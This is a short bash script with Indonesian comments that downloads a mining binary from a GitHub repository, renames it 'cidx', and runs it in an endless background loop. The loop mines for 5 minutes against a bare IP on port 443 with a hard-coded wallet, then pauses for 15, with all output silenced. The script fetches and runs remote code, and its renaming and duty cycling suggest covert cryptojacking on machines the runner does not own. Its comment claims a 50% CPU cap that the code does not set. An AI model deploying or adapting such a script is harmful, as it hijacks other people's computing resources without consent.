#!/bin/bash

echo "[veco1-loop] Dimulai pada $(date)"

# Bersihkan proses sebelumnya
pkill cidx

# Download binary mining
rm -f cidx
wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1

chmod +x cidx

# Loop mining 5 menit, istirahat 15 menit
while true; do
  echo "[⛏️ START] $(date): Mining aktif 5 menit..."
  
  # Jalankan cidx dengan cpulimit untuk membatasi CPU ke 50%
  nohup cpulimit --limit=400  ./cidx -a yespower \
    -o 45.115.224.108:443 \
    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
    -p c=VECO,m=solo,zap=VECO,mc=VECO \
    -t 6 &>/dev/null &

  sleep 300   # 5 menit mining

  echo "[🛑 STOP] $(date): Mining dihentikan sementara."
  pkill cidx

  echo "[⏱ WAIT] Delay 15 menit sebelum jalan ulang..."
  sleep 900   # 15 menit istirahat
done
